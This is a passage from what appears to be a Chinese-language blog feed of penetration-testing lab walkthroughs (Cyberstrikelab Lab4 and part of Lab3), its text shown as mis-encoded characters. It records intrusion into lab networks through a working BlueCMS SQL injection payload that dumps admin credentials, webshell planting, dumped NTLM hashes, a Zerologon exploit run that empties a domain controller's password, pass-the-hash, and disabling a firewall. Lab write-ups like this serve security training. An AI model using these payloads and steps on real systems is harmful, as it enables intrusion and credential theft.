Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:32 CST
Nmap scan report for 192.168.10.10                                                              
Host is up (0.055s latency).                                                                    
                                                                                                
PORT      STATE SERVICE       VERSION                                                                                                                                                           
135/tcp   open  msrpc         Microsoft Windows RPC  
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)       
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-13T18:36:07+00:00; -7h59m59s from scanner time.
| ssl-cert: Subject: commonName=DESKTOP-JFB57A8
| Not valid before: 2025-08-12T18:25:20
|_Not valid after:  2026-02-11T18:25:20                                                         
| rdp-ntlm-info:      
|   Target_Name: DESKTOP-JFB57A8
|   NetBIOS_Domain_Name: DESKTOP-JFB57A8      
|   NetBIOS_Computer_Name: DESKTOP-JFB57A8
|   DNS_Domain_Name: DESKTOP-JFB57A8
|   DNS_Computer_Name: DESKTOP-JFB57A8
|   Product_Version: 10.0.18362
|_  System_Time: 2025-08-13T18:35:38+00:00
5040/tcp  open  unknown
5820/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
| http-cookie-flags:      
|   /: 
|     PHPSESSID:                                                                                                                                                                                
|_      httponly flag not set                                                                   
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
|_http-title: \xD1\xDD\xCA\xBE\xCD\xF8\xD5\xBE - Powered by BlueCMS
| http-robots.txt: 9 disallowed entries 
| /admin/ /api/ /data/ /include/ /install/ /templates/ 
|_/uc_client/ /user.php /comment.php
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H1 (92%), M
icrosoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%
)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7h59m59s, deviation: 0s, median: -8h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-13T18:35:40
|_  start_date: N/A
```

`5820` æ˜¯ `Web`æœåŠ¡

## 192.168.10.10

### BlueCMS

æ­å»ºç€çš„æ˜¯ `BlueCMS`

![image.png](/post-images/CyberstrikelabLab4/image.png)

åœ¨é¡µè„šä¸­èƒ½æ‰¾åˆ°æ˜¯ï¼š`Powered by BlueCMS v1.6`

å­˜åœ¨ `SQL`æ³¨å…¥æ¼æ´

> https://www.cnblogs.com/Hi-blog/p/7990894.html#_label30
> 

![image.png](/post-images/CyberstrikelabLab4/image1.png)

æ‹¿ç”¨æˆ·å¯†ç 

```php
ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin
```

![image.png](/post-images/CyberstrikelabLab4/image2.png)

è§£å‡ºæ¥å¯†ç æ˜¯ï¼š`admin123456`

### åå° GetShell

ç™»å½•åå°ï¼Œåœ¨æ¨¡ç‰ˆè®¾ç½®é‡Œé¢

![image.png](/post-images/CyberstrikelabLab4/image3.png)

> åˆ©ç”¨é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_72007549/article/details/127540398
> 

åœ¨å¤´éƒ¨å†™ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæäº¤

![image.png](/post-images/CyberstrikelabLab4/image4.png)

èšå‰‘è¿æ¥ä¸Š

![image.png](/post-images/CyberstrikelabLab4/image5.png)

æƒé™å¾ˆé«˜æ˜¯ `system`æƒé™

![image.png](/post-images/CyberstrikelabLab4/image6.png)

åœ¨æ ¹ç›®å½•è¯»åˆ° `flag`

```php
C:\> type flag.txt
go-flag{ovuRsBeMqji13Rrc}
```

è¿™é‡Œç”¨ä¸Š `CS` äº†

![image.png](/post-images/CyberstrikelabLab4/image7.png)

### ä¿¡æ¯æ”¶é›†

æŠ“ä¸€ä¸‹ `HASH`

```php
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82541 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
apache:1002:aad3b435b51404eeaad3b435b51404ee:0047605c0f2b9342a96ff4502f0f1a84:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:809f928153e9cdf27a043a18028a6efd:::
web:1001:aad3b435b51404eeaad3b435b51404ee:081dece85a94bf4a198aa49d8042347e:::
```

è¿ç§»åˆ° `MSF`

![image.png](/post-images/CyberstrikelabLab4/image8.png)

æŸ¥çœ‹ç½‘æ®µä¿¡æ¯

```php
Interface 16
============
Name         : Realtek RTL8139C+ Fast Ethernet NIC #3
Hardware MAC : b0:5e:4f:ef:a4:d3
MTU          : 1500
IPv4 Address : 192.168.20.10
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::c8c0:3fc0:ab95:1f0a
IPv6 Netmask : ffff:ffff:ffff:ffff::

Interface 17
============
Name         : Realtek RTL8139C+ Fast Ethernet NIC #2
Hardware MAC : 10:98:36:73:90:72
MTU          : 1500
IPv4 Address : 192.168.10.10
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a898:1c84:d7f:2d59
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

ä¸Šä¼  `Fscan`æ‰«æ

```php
C:\>fscan.exe -h 192.168.20.1-255 -nobr
fscan.exe -h 192.168.20.1-255 -nobr
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚
â”‚  / /_\/____/ __|/ __| __/ _` |/ __| |/ /    â”‚
â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   <     â”‚
â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: 2.0.0

[2025-08-14 03:25:46] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1
[2025-08-14 03:25:46] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ
[2025-08-14 03:25:46] [INFO] ç”ŸæˆIPèŒƒå›´: 192.168.20.1 - 192.168.20.255
[2025-08-14 03:25:46] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 255
[2025-08-14 03:25:46] [INFO] å¼€å§‹ä¸»æœºæ‰«æ
[2025-08-14 03:25:46] [SUCCESS] ç›®æ ‡ 192.168.20.10   å­˜æ´» (ICMP)
[2025-08-14 03:25:46] [SUCCESS] ç›®æ ‡ 192.168.20.30   å­˜æ´» (ICMP)
[2025-08-14 03:25:46] [SUCCESS] ç›®æ ‡ 192.168.20.20   å­˜æ´» (ICMP)
[2025-08-14 03:25:49] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3
[2025-08-14 03:25:49] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233
[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:88
[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:135
[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:135
[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:135
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:139
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:445
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:445
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:139
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:445
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:389
[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:139
[2025-08-14 03:25:53] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:3306
[2025-08-14 03:25:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:88 =>
[2025-08-14 03:25:55] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:7001
[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:139 =>  Banner:[.]
[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:445 =>
[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:445 =>
[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:139 =>  Banner:[.]
[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:445 =>
[2025-08-14 03:25:57] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:139 =>  Banner:[.]
[2025-08-14 03:25:57] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:7680
[2025-08-14 03:26:02] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:389 =>
[2025-08-14 03:26:05] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:7001 => [http] äº§å“:Oracle WebLogic admin httpd
[2025-08-14 03:26:10] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:3306 =>  Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed to connect to this MySQL server]
[2025-08-14 03:26:52] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:7680 =>
[2025-08-14 03:26:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:135 =>
[2025-08-14 03:26:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:135 =>
[2025-08-14 03:26:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:135 =>
[2025-08-14 03:26:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 14
[2025-08-14 03:26:55] [INFO] å¼€å§‹æ¼æ´æ‰«æ
[2025-08-14 03:26:55] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-08-14 03:26:55] [SUCCESS] NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: 192.168.20.10
ä¸»æœºå: DESKTOP-JFB57A8
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ 192.168.10.10
[2025-08-14 03:26:55] [SUCCESS] NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: 192.168.20.20
ä¸»æœºå: cyberweb
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ 192.168.20.20
[2025-08-14 03:26:55] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[2025-08-14 03:26:58] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://192.168.20.20:7001 çŠ¶æ€ç :404 é•¿åº¦:1164   æ ‡é¢˜:Error 404--Not Found
[2025-08-14 03:26:58] [SUCCESS] å‘ç°æŒ‡çº¹ ç›®æ ‡: http://192.168.20.20:7001 æŒ‡çº¹: [weblogic]
```

## 192.168.20.20 - 1

### Weblogic

æ‰«æå‡ºæ¥ `Weblogic`

ç”¨å·¥å…·æ‰«æä¸€ä¸‹

```php
âœ  WeblogicScan git:(master) âœ— proxychains -q python WeblogicScan.py -u 192.168.20.20 -p 7001
/root/Desktop/Tools/WeblogicScan/WeblogicScan.py:6: SyntaxWarning: invalid escape sequence '\ '
  |  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __

__        __   _     _             _        ____                  
\ \      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __  
 \ \ /\ / / _ \ '_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | '_ \ 
  \ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |
   \_/\_/ \___|_.__/|_|\___/ \__, |_|\___| |____/ \___\__,_|_| |_|
                             |___/ 
                             By Tide_RabbitMask | V 1.5 

Welcome To WeblogicScan !!!
Whoamiï¼šhttps://github.com/rabbitmask
[*] =========Task Start=========
[+] [192.168.20.20:7001] Weblogic Version Is 12.2.1.4.0
[+] [192.168.20.20:7001] Weblogic console address is exposed! The path is: http://192.168.20.20:7001/console/login/LoginForm.jsp
[-] [192.168.20.20:7001] Weblogic UDDI module default path does not exist!
[-] [192.168.20.20:7001] weblogic not detected CVE-2016-0638
[-] [192.168.20.20:7001] weblogic not detected CVE-2016-3510
[-] [192.168.20.20:7001] weblogic not detected CVE-2017-10271
[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3248
[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3506
[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2628
[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2893
[+] [192.168.20.20:7001] weblogic has a JAVA deserialization vulnerability:CVE-2018-2894
[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2725
[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2890
[*] =========Task E n d=========
```

æ²¡æœ‰è´¦æˆ·ï¼Œæ²¡æ³•æ‰“

![image.png](/post-images/CyberstrikelabLab4/image9.png)

## 192.168.20.30

### ä¿¡æ¯æ”¶é›†

è¿™é‡Œå…ˆæ‰“ `192.168.20.30`

ä»ä¸Šé¢æ‰«æä¸­èƒ½çŸ¥é“ï¼Œè¿™æ˜¯ `DC` 

å…ˆå°è¯•æšä¸¾ä¸€æ³¢

```php
âœ  Tools proxychains nxc smb 192.168.20.30 -u anonymous -p ''
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) 
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\anonymous: STATUS_LOGON_FAILURE 
```

![image.png](/post-images/CyberstrikelabLab4/image10.png)

å¹¶æ²¡æœ‰æšä¸¾å‡ºæ¥ä»€ä¹ˆ

### Zerologon

è¿™é‡Œå†è¯•è¯• `zerologon`

```php
âœ  CVE-2020-1472-tester git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
================================================================
Success! DC can be fully compromised by a Zerologon attack.
```

è¿˜çœŸæœ‰ï¼Œæ‰“ `exp`

```php
âœ  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
==================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

Dumphash

![image.png](/post-images/CyberstrikelabLab4/image11.png)

`PTH` æ‹¿ `flag3`

![image.png](/post-images/CyberstrikelabLab4/image12.png)

## 192.168.20.20 - 2

ä»æ‰«æç»“æœçœ‹ï¼Œ`192.168.20.20`ä¹Ÿæ˜¯åŸŸå†…ä¸»æœºï¼Œä¹Ÿæ˜¯ç›´æ¥ `PTH`

![image.png](/post-images/CyberstrikelabLab4/image13.png)

è¯» flag2

```php
C:\Windows\system32> type C:\flag.txt
go-flag{yJzuQ09FXn0h7Em4}
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>blueCMS</category>
            <category>å¤šå±‚å†…ç½‘</category>
            <category>zerologon</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab3]]></title>
            <link>https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab3 https://www.cyberstrikelab.com/#/scene/detail/22 Recon æç¤º 192.168.10.0 ç½‘æ®µ æ‰«æå‡ºæ¥ 192.168.10.10 HTTP ç«¯å£åœ¨3590 192.168.10.10 taoCMS è®¿é—® Web ç«™ç‚¹ å¯»æ‰¾å…¬å¼€æ¼æ´ h...]]></description>
            <content:encoded><![CDATA[
# Lab3

> https://www.cyberstrikelab.com/#/scene/detail/22
> 

## Recon

æç¤º `192.168.10.0` ç½‘æ®µ

```php
âœ  Lab3 nmap -sn 192.168.10.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:42 CST
Nmap scan report for 192.168.10.10
Host is up (0.053s latency).
Nmap scan report for 192.168.10.233
Host is up (0.075s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 18.25 seconds
```

æ‰«æå‡ºæ¥ `192.168.10.10`

```php
âœ  Lab3 nmap -sT -min-rate 5000 -p- 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:43 CST
Nmap scan report for 192.168.10.10
Host is up (0.050s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3590/tcp  open  wv-csp-sms
5040/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds
```

`HTTP` ç«¯å£åœ¨`3590`

```php
âœ  Lab3 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:44 CST
Nmap scan report for 192.168.10.10
Host is up (0.054s latency).
                                                
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                             
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)
3590/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
|_http-title:  taoCMS\xE6\xBC\x94\xE7\xA4\xBA
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 21H2 (92%), M
icrosoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 10 1903 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%
)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -8h00m00s                                                                         
| smb2-security-mode:                                                                           
|   3:1:1:                                                                                      
|_    Message signing enabled but not required                                                  
| smb2-time:                                                                                    
|   date: 2025-08-12T05:47:37                                                                   
|_  start_date: N/A                                                                             
                                                                                                                                                                                                
TRACEROUTE (using proto 1/icmp)                                                                                                                                                                 
HOP RTT      ADDRESS                                                                                                                                                                            
1   50.73 ms 172.16.233.1
2   50.81 ms 192.168.10.10                                                                      
                                                
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.96 seconds
```

## 192.168.10.10

### taoCMS

è®¿é—® `Web` ç«™ç‚¹

![image.png](/post-images/CyberstrikelabLab3/image.png)

å¯»æ‰¾å…¬å¼€æ¼æ´

> https://blog.csdn.net/2302_82189125/article/details/140086872
> 

ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç æˆåŠŸè¿›å»äº†

![image.png](/post-images/CyberstrikelabLab3/image1.png)

æ¥åˆ°æ–‡ä»¶ç®¡ç†é¡µé¢ï¼Œæ–°å»ºæ–‡ä»¶

![image.png](/post-images/CyberstrikelabLab3/image2.png)

ç‚¹å‡»ç¼–è¾‘å†™é©¬å­è¿›å»å°±è¡Œäº†

![image.png](/post-images/CyberstrikelabLab3/image3.png)

`system` æƒé™

![image.png](/post-images/CyberstrikelabLab3/image4.png)

ç›´æ¥ä¸Š `Vshell` ï¼Œé¦–å…ˆå…³é—­é˜²ç«å¢™å’Œå¼€å¯è¿œç¨‹æ¡Œé¢

![image.png](/post-images/CyberstrikelabLab3/image5.png)

é€šè¿‡ä¸€é”®ä¸Šçº¿å‘½ä»¤

![image.png](/post-images/CyberstrikelabLab3/image6.png)

### ä¿¡æ¯æ”¶é›†

è¯»å– `flag1`

```php
C:\phpstudy_pro\WWW>type C:\flag.txt
go-flag{IpbKNIOigmnsuwY3}
```

æŸ¥çœ‹ç½‘æ®µä¿¡æ¯

```php
C:\phpstudy_pro\WWW>ipconfig

Windows IP é…ç½®

ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::81e3:1433:2412:22d8%17
   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.10.10
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.10.233

ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0 2:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::edc1:3601:4f28:7fc4%11
   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.20.10
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.20.1
```

å­˜åœ¨ `192.168.20.0` ç½‘æ®µï¼ŒåŠ ä¸Š `flag` çš„æç¤º

![image.png](/post-images/CyberstrikelabLab3/image7.png)

ä¸Šä¼  `fscan` æ‰«æï¼Œå…ˆæ‰“ `192.168.20.20`

## 192.168.20.20

### ä¿¡æ¯æ”¶é›†

`fscan` æ‰«æï¼Œ`8055` æ˜¯ `web` æœåŠ¡

```php
C:\>fscan -h 192.168.20.20 -nobr -p 1-65535
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚
â”‚  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚
â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   <     â”‚
â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: 2.0.0

[2025-08-12 14:31:40] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1
[2025-08-12 14:31:40] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ
[2025-08-12 14:31:40] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1
[2025-08-12 14:31:40] [INFO] å¼€å§‹ä¸»æœºæ‰«æ
[2025-08-12 14:31:40] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 65535
[2025-08-12 14:31:45] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:135
[2025-08-12 14:31:45] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:139
[2025-08-12 14:31:50] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:139 =>  Banner:[.]
[2025-08-12 14:31:57] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:445
[2025-08-12 14:32:02] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:445 => 
[2025-08-12 14:32:50] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:135 => 
[2025-08-12 14:33:43] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:3306
[2025-08-12 14:33:43] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:3306 => [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed
to connect to this MySQL server]
[2025-08-12 14:35:13] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:5985
[2025-08-12 14:35:19] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:5985 => [http] ç‰ˆæœ¬:2.0 äº§å“:Microsoft HTTPAPI httpd ç³»ç»Ÿ:Windows
[2025-08-12 14:36:24] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:8055
[2025-08-12 14:36:35] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:8055 => [http]
```

é€šè¿‡ `Vshell` è®¾ç½® `socks` ä»£ç†ï¼Œç„¶åç»™ `yakit` è®¾ç½®ä¸‹æ¸¸ä»£ç†å³å¯è®¿é—®

![image.png](/post-images/CyberstrikelabLab3/image8.png)

æ˜¯ `thinkphp`ï¼Œæç¤ºè¯´è¢«æ¸—é€è¿‡äº†

è¿™é‡Œæ‰«æäº†ä¸€æ³¢æ²¡æ‰«æå‡ºæ¥ï¼Œå¯èƒ½ç½‘ç«™è¢«æŒ‚é©¬äº†ï¼Œçˆ†ç ´ä¸€ä¸‹

è¿™é‡Œå°è¯•äº†ä½¿ç”¨ `ffuf` å’Œ `wfuzz` æ¥è¿›è¡Œçˆ†ç ´ï¼Œä½†æ˜¯å¹¶ä¸ç†æƒ³

### **awBruter**

çœ‹äº†ä¸€ä¸‹ `WP` ï¼Œæ˜¯é€šè¿‡ `awBruter` æ¥çˆ†ç ´ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç  `admin123`

![image.png](/post-images/CyberstrikelabLab3/image9.png)

èšå‰‘è¿æ¥

![image.png](/post-images/CyberstrikelabLab3/image10.png)

è¢«æŒ‚é©¬çš„åœ°æ–¹ï¼š

![image.png](/post-images/CyberstrikelabLab3/image11.png)

æŸ¥çœ‹æƒé™

![image.png](/post-images/CyberstrikelabLab3/image12.png)

è¯»å– `flag2`

```php
C:\> type flag.txt
go-flag{C2AoW93mioh5XYQg}
```

ä¸Šçº¿æœ‰ç‚¹éº»çƒ¦å°±ç®—äº†ï¼Œé€šè¿‡ `stowaway` æˆ–è€… `chisel` å¼„ä¸€ä¸ªç«¯å£æ˜ å°„å°±è¡Œ

## 192.168.20.30

### ä¿¡æ¯æ”¶é›†

é€šè¿‡ `192.168.20.20` èƒ½çŸ¥é“ `192.168.20.30` å°±æ˜¯ `DC`

